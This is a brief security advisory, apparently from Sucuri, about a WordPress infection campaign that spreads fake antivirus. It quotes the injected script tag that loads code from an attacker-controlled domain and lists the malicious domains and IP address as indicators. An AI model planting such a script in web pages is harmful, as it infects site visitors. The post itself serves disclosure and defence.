Hilary Kneber Again – welcometotheglobalisorg

We are seeing (again) a number of sites infected with a variation of the welcometotheglobalisnet.com malware string that appeared a few weeks ago.
The details are the same as in the previous post except that now they are using welcometotheglobalisorg.com (note the org instead of net) to spread the malware.

The infected sites have the following javascript added to all their posts (generally affecting WordPress):

<script src "http://welcometotheglobalisorg.com/js.php?kk=26′></script>

Shameless plug: If you need help cleaning up your site, we can do it for you: http://sucuri.net/signup
What happens when someone clicks an infected site?
What the malware does is very simple, it contacts a few domains (all in the IP address 65.23.153.126):

antivirus-microsoft-corporation.com
www3.aboutavsoft.com
www3.first-guardul.cz.cc
www3.first-security-checker.com
www3.incredible-protectionro.rr.nu
www3.netprotectionsoftre.com
www3.save-internet-foru.com
www3.simpleclean-foru.net
www3.smart-security-holder.in
www3.smartsuite-4u.in
www3.specialprotectionti.rr.nu
www3.top-network-guard.in

www4.goodghtsafe.rr.nu
www4.seeeresafe.in
www4.seefredsafe.in
www4.smartinternet-foryou.net
www4.top-only-scanner.uni.cc

It will then try to infect the visitor via their browser (with a fake anti virus). We are still analyzing the infected sites, and we’ll post more details as they’re discovered.

Those domains are not blacklisted (by Google or Norton), so the risk of infection is high.

If your site is infected with malware and you need help, visit Sucuri, we’ll get you cleaned up.
